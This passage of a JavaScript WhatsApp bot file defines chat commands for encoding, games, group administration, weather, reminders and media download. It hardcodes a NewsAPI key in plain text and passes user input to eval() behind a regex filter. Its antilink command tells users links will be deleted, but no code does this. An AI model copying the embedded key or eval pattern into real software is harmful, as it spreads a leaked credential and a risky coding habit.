      ...options, 
      weekday: "long", 
      year: "numeric", 
      month: "long", 
      day: "numeric" 
    };

    const localTime = now.toLocaleTimeString("en-US", options);
    const localDate = now.toLocaleDateString("en-US", timeOptions);

    // Send the local time and date as reply
    repondre(`🕰️ *Current Local Time:* ${localTime}\n📅 *Current Date:* ${localDate}`);
  } catch (e) {
    console.error("Error in .timezone command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "color",
  aliases: ["rcolor", "colorcode"],
  desc: "Generate a random color with name and code.",
  categorie: "script",
  reaction: '🤦',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const colorNames = [
      "Red", "Green", "Blue", "Yellow", "Orange", "Purple", "Pink", "Brown", "Black", "White", 
      "Gray", "Cyan", "Magenta", "Violet", "Indigo", "Teal", "Lavender", "Turquoise"
    ];
    
    const randomColorHex = "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
    const randomColorName = colorNames[Math.floor(Math.random() * colorNames.length)];

    repondre(`🎨 *Random Color:* \nName: ${randomColorName}\nCode: ${randomColorHex}`);
  } catch (e) {
    console.error("Error in .color command:", e);
    repondre("❌ An error occurred while generating the random color.");
  }
});

hango({
  nomCom: "binary",
  aliases: ["binarydgt", "binarycode"],
  desc: "Convert text into binary format",
  categorie: "script",
  reaction: '🤦',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");
  
  if (!text) {
    return repondre('Please provide a text to convert to binary.');
  }

  try {
    const binaryText = text.split('').map(char => {
      return `00000000${char.charCodeAt(0).toString(2)}`.slice(-8);
    }).join(' ');

    repondre(`🔑 *Binary Representation:* \n${binaryText}`);
  } catch (e) {
    console.error("Error in .binary command:", e);
    repondre("❌ An error occurred while converting to binary.");
  }
});

hango({
  nomCom: "dbinary",
  aliases: ["binarydecode", "decodebinary"],
  desc: "Decode binary string into text.",
  categorie: "script",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");
  
  if (!text) {
    return repondre("❌ Please provide the binary string to decode.");
  }

  try {
    const binaryString = text;
    const textDecoded = binaryString.split(' ').map(bin => {
      return String.fromCharCode(parseInt(bin, 2));
    }).join('');

    repondre(`🔓 *Decoded Text:* \n${textDecoded}`);
  } catch (e) {
    console.error("Error in .dbinary command:", e);
    repondre("❌ An error occurred while decoding the binary string.");
  }
});

hango({
  nomCom: "base64",
  aliases: ["base64encode", "encodebase64"],
  desc: "Encode text into Base64 format.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into Base64.");
  }

  try {
    // Encode the text into Base64
    const encodedText = Buffer.from(text).toString('base64');
    
    // Send the encoded Base64 text
    repondre(`🔑 *Encoded Base64 Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .base64 command:", e);
    repondre("❌ An error occurred while encoding the text into Base64.");
  }
});

hango({
  nomCom: "unbase64",
  aliases: ["base64decode", "decodebase64"],
  desc: "Decode Base64 encoded text.",
  categorie: "script",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the Base64 encoded text to decode.");
  }

  try {
    // Decode the Base64 text
    const decodedText = Buffer.from(text, 'base64').toString('utf-8');
    
    // Send the decoded text
    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .unbase64 command:", e);
    repondre("❌ An error occurred while decoding the Base64 text.");
  }
});

hango({
  nomCom: "urlencode",
  aliases: ["urlencode", "encodeurl"],
  desc: "Encode text into URL encoding.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into URL encoding.");
  }

  try {
    // Encode the text into URL encoding
    const encodedText = encodeURIComponent(text);

    // Send the encoded URL text
    repondre(`🔑 *Encoded URL Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .urlencode command:", e);
    repondre("❌ An error occurred while encoding the text.");
  }
});

hango({
  nomCom: "urldecode",
  aliases: ["decodeurl", "urldecode"],
  desc: "Decode URL encoded text.",
  categorie: "coding",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the URL encoded text to decode.");
  }

  try {
    const decodedText = decodeURIComponent(text);

    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .urldecode command:", e);
    repondre("❌ An error occurred while decoding the URL encoded text.");
  }
});

hango({
  nomCom: "dice",
  aliases: ["rolldice", "diceroll", "roll"],
  desc: "Roll a dice (1-6).",
  categorie: "fun",
  reaction: '🎲',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Roll a dice (generate a random number between 1 and 6)
    const result = Math.floor(Math.random() * 6) + 1;
    
    // Send the result
    repondre(`🎲 You rolled: *${result}*`);
  } catch (e) {
    console.error("Error in .roll command:", e);
    repondre("❌ An error occurred while rolling the dice.");
  }
});

hango({
  nomCom: "coinflip",
  aliases: ["flipcoin", "coinflip"],
  desc: "Flip a coin and get Heads or Tails.",
  categorie: "fun",
  reaction: '🪙',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Simulate coin flip (randomly choose Heads or Tails)
    const result = Math.random() < 0.5 ? "Heads" : "Tails";
    
    // Send the result
    repondre(`🪙 Coin Flip Result: *${result}*`);
  } catch (e) {
    console.error("Error in .coinflip command:", e);
    repondre("❌ An error occurred while flipping the coin.");
  }
});

hango({
  nomCom: "flip",
  aliases: ["fliptext", "textflip"],
  desc: "Flip the text you provide.",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to flip.");
  }

  try {
    // Flip the text
    const flippedText = text.split('').reverse().join('');
    
    // Send the flipped text
    repondre(`🔄 Flipped Text: *${flippedText}*`);
  } catch (e) {
    console.error("Error in .flip command:", e);
    repondre("❌ An error occurred while flipping the text.");
  }
});

hango({
  nomCom: "pick",
  aliases: ["choose", "select"],
  desc: "Pick between two choices.",
  categorie: "fun",
  reaction: '🚚',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // Ensure two options are provided
  if (!text.includes(',')) {
    return repondre("❌ Please provide two choices to pick from. Example: `.pick Ice Cream, Pizza`");
  }

  try {
    // Pick a random option
    const options = text.split(',').map(option => option.trim());
    const choice = options[Math.floor(Math.random() * options.length)];

    // Send the result
    repondre(`🎉 Bot picks: *${choice}*`);
  } catch (e) {
    console.error("Error in .pick command:", e);
    repondre("❌ An error occurred while processing your request.");
  }
});

hango({
  nomCom: "timenow",
  aliases: ["currenttime", "time"],
  desc: "Check the current local time.",
  categorie: "new",
  reaction: '🕰️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Get current date and time
    const now = new Date();
    
    // Get local time in the configured timezone
    const localTime = now.toLocaleTimeString("en-US", { 
      hour: "2-digit", 
      minute: "2-digit", 
      second: "2-digit", 
      hour12: true,
      timeZone: conf.TIMEZONE, // Using the configured timezone from set.js
    });
    
    // Send the local time as reply
    repondre(`🕒 Current Local Time: ${localTime}`);
  } catch (e) {
    console.error("Error in .timenow command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "date",
  aliases: ["currentdate", "todaydate"],
  desc: "Check the current date.",
  categorie: "new",
  reaction: '📆',
}, async (dest, hn, context) => {
  const { repondre } = context;

  try {
    // Get current date
    const now = new Date();
    
    // Get the formatted date (e.g., "Monday, January 15, 2025")
    const currentDate = now.toLocaleDateString("en-US", {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric"
    });
    
    // Send the current date as reply
    repondre(`📅 Current Date: ${currentDate}`);
  } catch (e) {
    console.error("Error in .date command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "calculate2",
  aliases: ["calcu", "maths", "mathema"],
  desc: "Evaluate a mathematical expression.",
  categorie: "new",
  reaction: '🧮',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // Ensure arguments are provided
  if (!text) {
    return repondre("🧮 Use this command like:\n *Example:* .calculate 5+3*2");
  }

  // Validate the input to prevent unsafe operations
  if (!/^[0-9+\-*/().\s]+$/.test(text)) {
    return repondre("❎ Invalid expression. Only numbers and +, -, *, /, ( ) are allowed.");
  }

  try {
    // Evaluate the mathematical expression
    let result = eval(text);

    // Reply with the result
    repondre(`✅ Result of "${text}" is: ${result}`);
  } catch (e) {
    console.error("Error in .calculate command:", e);
    repondre("❎ Error in calculation. Please check your expression.");
  }
});

hango({
  nomCom: "emojify",
  aliases: ["emoji", "txtemoji"],
  desc: "Convert text into emoji form.",
  categorie: "fun",
  reaction: '🙂',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // If no valid text is provided
  if (!text) {
    return repondre("❌ Please provide some text to convert into emojis!");
  }

  try {
    // Map text to corresponding emoji characters
    const emojiMapping = {
      "a": "🅰️",
      "b": "🅱️",
      "c": "🇨️",
      "d": "🇩️",
      "e": "🇪️",
      "f": "🇫️",
      "g": "🇬️",
      "h": "🇭️",
      "i": "🇮️",
      "j": "🇯️",
      "k": "🇰️",
      "l": "🇱️",
      "m": "🇲️",
      "n": "🇳️",
      "o": "🅾️",
      "p": "🇵️",
      "q": "🇶️",
      "r": "🇷️",
      "s": "🇸️",
      "t": "🇹️",
      "u": "🇺️",
      "v": "🇻️",
      "w": "🇼️",
      "x": "🇽️",
      "y": "🇾️",
      "z": "🇿️",
      "0": "0️⃣",
      "1": "1️⃣",
      "2": "2️⃣",
      "3": "3️⃣",
      "4": "4️⃣",
      "5": "5️⃣",
      "6": "6️⃣",
      "7": "7️⃣",
      "8": "8️⃣",
      "9": "9️⃣",
      " ": "␣" // for space
    };

    // Convert the input text into emoji form
    const emojiText = text.toLowerCase().split("").map(char => emojiMapping[char] || char).join("");

    await hn.sendMessage(dest, {
      text: emojiText,
    }, { quoted: context.ms });

  } catch (e) {
    console.error("Error in .emoji command:", e);
    repondre(`❌ Error: ${e.message}`);
  }
});

hango({
  nomCom: "news2",
  aliases: ["latestnews", "newsheadlines"],
  desc: "Get the latest news headlines.",
  categorie: "AI",
  reaction: '🗞️',
}, async (dest, hn, context) => {
  const { repondre, from } = context;

  try {
    const apiKey = "0f2c43ab11324578a7b1709651736382";
    const response = await axios.get(`https://newsapi.org/v2/top-headlines?country=us&apiKey=${apiKey}`);
    const articles = response.data.articles;

    if (!articles.length) {
      return repondre("No news articles found.");
    }

    // Send each article as a separate message with image and title
    for (let i = 0; i < Math.min(articles.length, 5); i++) {
      const article = articles[i];
      let message = `
📰 *${article.title}*
📝 _${article.description}_
🔗 _${article.url}_

> © Powered by ${conf.BOT}
      `;

      console.log('Article URL:', article.urlToImage); // Log image URL for debugging

      if (article.urlToImage) {
        // Send image with caption
        await hn.sendMessage(dest, { image: { url: article.urlToImage }, caption: message });
      } else {
        // Send text message if no image is available
        await hn.sendMessage(dest, { text: message });
      }
    }
  } catch (e) {
    console.error("Error fetching news:", e);
    repondre("Could not fetch news. Please try again later.");
  }
});

hango({
  nomCom: "groupinfo",
  aliases: ["ginfo", "infogroup"],
  desc: "Get detailed information about the current group",
  categorie: "group",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const participants = groupMetadata.participants;
    
    // Count admins
    const adminCount = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').length;
    
    // Format creation date
    const creationDate = new Date(groupMetadata.creation * 1000).toLocaleDateString();
    
    // Create group info message
    const infoMessage = `
📊 *GROUP INFORMATION*
📝 *Name:* ${groupMetadata.subject}
👥 *Members:* ${participants.length}
👑 *Admins:* ${adminCount}
🆔 *Group ID:* ${dest.chat}
📅 *Created On:* ${creationDate}
${groupMetadata.desc ? `📄 *Description:* ${groupMetadata.desc}` : ''}
    `;
    
    await repondre(infoMessage);
  } catch (error) {
    console.error("Error in groupinfo command:", error);
    await repondre("❌ An error occurred while fetching group information.");
  }
});

hango({
  nomCom: "tagall",
  aliases: ["mentionall", "everyone"],
  desc: "Tag all members in the group",
  categorie: "group",
  reaction: '📢',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const participants = groupMetadata.participants;
    const isAdmin = participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get message to announce (if any)
    const message = arg.join(" ") || "Attention everyone!";
    
    // Create mentions array and message
    const mentions = participants.map(p => p.id);
    let mentionText = `📢 *${message}*\n\n`;
    
    participants.forEach(participant => {
      mentionText += `@${participant.id.split('@')[0]}\n`;
    });
    
    await hn.sendMessage(dest.chat, {
      text: mentionText,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in tagall command:", error);
    await repondre("❌ An error occurred while tagging group members.");
  }
});

hango({
  nomCom: "promote",
  aliases: ["makeadmin", "admin"],
  desc: "Promote a member to admin",
  categorie: "group",
  reaction: '👑',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to promote by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is already admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ This user is already an admin.");
    }
    
    // Promote the member
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "promote");
    
    await repondre(`👑 User @${targetId.split('@')[0]} has been promoted to admin.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in promote command:", error);
    await repondre("❌ An error occurred while promoting the member.");
  }
});

hango({
  nomCom: "demote",
  aliases: ["removeadmin", "unadmin"],
  desc: "Demote an admin to member",
  categorie: "group",
  reaction: '👤',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag an admin to demote by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isTargetAdmin) {
      return repondre("❌ This user is not an admin.");
    }
    
    // Demote the admin
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "demote");
    
    await repondre(`👤 User @${targetId.split('@')[0]} has been demoted to member.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in demote command:", error);
    await repondre("❌ An error occurred while demoting the admin.");
  }
});

hango({
  nomCom: "kick",
  aliases: ["remove", "ban"],
  desc: "Remove a member from the group",
  categorie: "group",
  reaction: '🚫',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to remove by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot remove myself from the group.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot remove an admin from the group.");
    }
    
    // Remove the member
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "remove");
    
    await repondre(`🚫 User @${targetId.split('@')[0]} has been removed from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in kick command:", error);
    await repondre("❌ An error occurred while removing the member.");
  }
});

hango({
  nomCom: "groupsettings",
  aliases: ["setgroup", "editgroup"],
  desc: "Change group settings (name, description, etc.)",
  categorie: "group",
  reaction: '⚙️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check for valid setting and value
    if (arg.length < 2) {
      return repondre(`
❌ Please specify a setting and value.

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
      `);
    }
    
    const setting = arg[0].toLowerCase();
    const value = arg.slice(1).join(" ");
    
    switch (setting) {
      case 'name':
        await hn.groupUpdateSubject(dest.chat, value);
        await repondre(`✅ Group name changed to: *${value}*`);
        break;
        
      case 'desc':
        await hn.groupUpdateDescription(dest.chat, value);
        await repondre(`✅ Group description updated.`);
        break;
        
      case 'lock':
        await hn.groupSettingUpdate(dest.chat, 'locked');
        await repondre(`🔒 Group settings have been locked. Only admins can change group info now.`);
        break;
        
      case 'unlock':
        await hn.groupSettingUpdate(dest.chat, 'unlocked');
        await repondre(`🔓 Group settings have been unlocked. All members can change group info now.`);
        break;
        
      default:
        await repondre(`
❌ Invalid setting. Available options:

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
        `);
    }
  } catch (error) {
    console.error("Error in groupsettings command:", error);
    await repondre("❌ An error occurred while updating group settings.");
  }
});

hango({
  nomCom: "poll",
  aliases: ["vote", "createpoll"],
  desc: "Create a poll in the group",
  categorie: "group",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check arguments
    if (arg.length < 3) {
      return repondre(`
❌ Please provide a question and at least 2 options.

📝 *Usage:*
.poll What's your favorite color? | Red | Blue | Green | Yellow
      `);
    }
    
    // Parse the poll data
    const pollData = arg.join(" ").split("|").map(item => item.trim());
    const question = pollData[0];
    const options = pollData.slice(1);
    
    if (options.length < 2) {
      return repondre("❌ Please provide at least 2 options separated by | symbol.");
    }
    
    // Create and send the poll
    await hn.sendMessage(dest.chat, {
      poll: {
        name: question,
        values: options,
        selectableCount: 1
      }
    });
  } catch (error) {
    console.error("Error in poll command:", error);
    await repondre("❌ An error occurred while creating the poll. Make sure you're using the correct format: question | option1 | option2 | ...");
  }
});

// Fun and utility commands

hango({
  nomCom: "tts",
  aliases: ["speak", "say"],
  desc: "Convert text to speech",
  categorie: "utility",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to speech.");
    }
    
    // Create TTS URL with Google Translate API
    const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(text)}&tl=en&client=tw-ob`;
    
    // Send audio
    await hn.sendMessage(dest.chat, {
      audio: { url: ttsUrl },
      mimetype: 'audio/mp4',
      ptt: true
    });
  } catch (error) {
    console.error("Error in tts command:", error);
    await repondre("❌ An error occurred while generating speech.");
  }
});

hango({
  nomCom: "weather",
  aliases: ["forecast", "climate"],
  desc: "Get weather information for a location",
  categorie: "utility",
  reaction: '🌤️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const location = arg.join(" ");
    
    if (!location) {
      return repondre("❌ Please provide a location to check weather for.");
    }
    
    // Use OpenWeatherMap API (you need to add API key to conf)
    const apiKey = conf.WEATHER_API_KEY || "your_openweathermap_api_key";
    const weatherUrl = `https://api.openweathermap.org/data/2.5/weather?q=${encodeURIComponent(location)}&units=metric&appid=${apiKey}`;
    
    const response = await axios.get(weatherUrl);
    const data = response.data;
    
    const weatherInfo = `
🌤️ *Weather in ${data.name}, ${data.sys.country}*

🌡️ *Temperature:* ${Math.round(data.main.temp)}°C
🌡️ *Feels like:* ${Math.round(data.main.feels_like)}°C
💧 *Humidity:* ${data.main.humidity}%
💨 *Wind:* ${data.wind.speed} m/s
☁️ *Conditions:* ${data.weather[0].description}
    `;
    
    await repondre(weatherInfo);
  } catch (error) {
    console.error("Error in weather command:", error);
    await repondre("❌ Could not fetch weather information. Make sure the location name is correct.");
  }
});

hango({
  nomCom: "sticker",
  aliases: ["stiker", "s"],
  desc: "Convert image, video or GIF to sticker",
  categorie: "utility",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    if (!dest.quoted) {
      return repondre("❌ Reply to an image, video or GIF to convert it to a sticker.");
    }
    
    // Check if quoted message contains media
    const quotedMessage = dest.quoted;
    if (!quotedMessage.image && !quotedMessage.video) {
      return repondre("❌ Please reply to an image, short video or GIF.");
    }
    
    // Download the media
    const media = await quotedMessage.download();
    
    // Send as sticker
    await hn.sendMessage(dest.chat, {
      sticker: media,
      author: "Created by Bot",
      pack: "WhatsApp Sticker"
    }, { quoted: context.ms });
    
  } catch (error) {
    console.error("Error in sticker command:", error);
    await repondre("❌ An error occurred while creating the sticker.");
  }
});

hango({
  nomCom: "reminder",
  aliases: ["remind", "remindme"],
  desc: "Set a reminder",
  categorie: "utility",
  reaction: '⏰',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (arg.length < 2) {
      return repondre(`
❌ Please specify time and reminder text.

📝 *Usage:*
.reminder 5m Call mom
.reminder 2h Meeting with client
.reminder 1d Birthday party

*Time units:* s (seconds), m (minutes), h (hours), d (days)
      `);
    }
    
    // Parse time
    const timeArg = arg[0].toLowerCase();
    const reminderText = arg.slice(1).join(" ");
    
    // Extract number and unit
    const match = timeArg.match(/^(\d+)([smhd])$/);
    
    if (!match) {
      return repondre("❌ Invalid time format. Use format like: 5m, 2h, 1d");
    }
    
    const timeValue = parseInt(match[1]);
    const timeUnit = match[2];
    
    // Convert to milliseconds
    let timeMs = 0;
    switch (timeUnit) {
      case 's': timeMs = timeValue * 1000; break;
      case 'm': timeMs = timeValue * 60 * 1000; break;
      case 'h': timeMs = timeValue * 60 * 60 * 1000; break;
      case 'd': timeMs = timeValue * 24 * 60 * 60 * 1000; break;
    }
    
    // Confirm reminder set
    await repondre(`⏰ Reminder set for ${timeArg} from now.`);
    
    // Set timeout for reminder
    setTimeout(async () => {
      await hn.sendMessage(dest.chat, {
        text: `⏰ *REMINDER*\n\n${reminderText}\n\n_Reminder set ${timeArg} ago_`,
        mentions: [dest.sender]
      });
    }, timeMs);
    
  } catch (error) {
    console.error("Error in reminder command:", error);
    await repondre("❌ An error occurred while setting the reminder.");
  }
});

// AI and media commands

hango({
  nomCom: "ytmp3",
  aliases: ["mp3", "ytaudio"],
  desc: "Download YouTube audio",
  categorie: "media",
  reaction: '🎵',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const url = arg[0];
    
    if (!url) {
      return repondre("❌ Please provide a YouTube video URL.");
    }
    
    if (!url.match(/^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)/)) {
      return repondre("❌ Please provide a valid YouTube URL.");
    }
    
    await repondre("⏳ Processing your request. This may take a moment...");
    
    // Use a YouTube download service API
    const ytDlUrl = `https://loader.to/api/button/?url=${encodeURIComponent(url)}&f=mp3`;
    
    // Get video info
    const info = await ytdl.getInfo(url);
    const videoTitle = info.videoDetails.title;
    const thumbnail = info.videoDetails.thumbnails[0].url;
    
    // Send audio with thumbnail
    await hn.sendMessage(dest.chat, {
      audio: { url: ytDlUrl },
      mimetype: 'audio/mpeg',
      fileName: `${videoTitle}.mp3`,
      contextInfo: {
        externalAdReply: {
          title: videoTitle,
          body: "YouTube MP3",
          thumbnailUrl: thumbnail,
          sourceUrl: url
        }
      }
    });
    
  } catch (error) {
    console.error("Error in ytmp3 command:", error);
    await repondre("❌ An error occurred while downloading the audio.");
  }
});

hango({
  nomCom: "quote",
  aliases: ["quotegen", "inspire"],
  desc: "Get an inspirational quote",
  categorie: "fun",
  reaction: '💭',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Call API to get a random quote
    const response = await axios.get('https://api.quotable.io/random');
    const { content, author } = response.data;
    
    await repondre(`💭 *"${content}"*\n\n— *${author}*`);
  } catch (error) {
    console.error("Error in quote command:", error);
    await repondre("❌ An error occurred while fetching a quote.");
  }
});

hango({
  nomCom: "joke",
  aliases: ["telljoke", "funny"],
  desc: "Get a random joke",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Here we would normally fetch from an API
    // This is a simulation with a few hardcoded jokes
    const jokes = [
      "Why don't scientists trust atoms? Because they make up everything!",
      "What's the best thing about Switzerland? I don't know, but the flag is a big plus.",
      "Did you hear about the mathematician who's afraid of negative numbers? He'll stop at nothing to avoid them.",
      "Why was the math book sad? Because it had too many problems.",
      "I told my wife she was drawing her eyebrows too high. She looked surprised.",
      "What do you call a fake noodle? An impasta!",
      "Why did the scarecrow win an award? Because he was outstanding in his field!",
      "I'm reading a book about anti-gravity. It's impossible to put down!",
      "I used to be a baker, but I couldn't make enough dough.",
      "Why don't eggs tell jokes? They'd crack each other up."
    ];
    
    const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
    await repondre(`😂 *JOKE TIME*\n\n${randomJoke}`);
  } catch (error) {
    console.error("Error in joke command:", error);
    repondre("❌ Failed to tell a joke. My sense of humor crashed.");
  }
});

hango({
  nomCom: "antilink",
  aliases: ["nolinks", "disablelinks"],
  desc: "Toggle anti-link feature in the group",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antilink mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antilink on or off. Example: .antilink on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antilink
      repondre("✅ Anti-link feature has been *enabled*. Links sent by non-admins will be deleted.");
    } else {
      // Disable antilink
      repondre("✅ Anti-link feature has been *disabled*. Members can now send links.");
    }
  } catch (error) {
    console.error("Error in antilink command:", error);
    repondre("❌ An error occurred while toggling the anti-link feature.");
  }
});

hango({
  nomCom: "warn",
  aliases: ["warning", "warnuser"],
  desc: "Warn a group member",
  categorie: "group",
  reaction: '⚠️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to warn by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot warn myself.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot warn an admin.");
    }
    
    // In a full implementation, you would track warnings in a database
    // This is a placeholder implementation
    await repondre(`⚠️ @${targetId.split('@')[0]} has been *warned*.\nFurther violations may result in removal from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in warn command:", error);
    repondre("❌ An error occurred while warning the member.");
  }
});

hango({
  nomCom: "revoke",
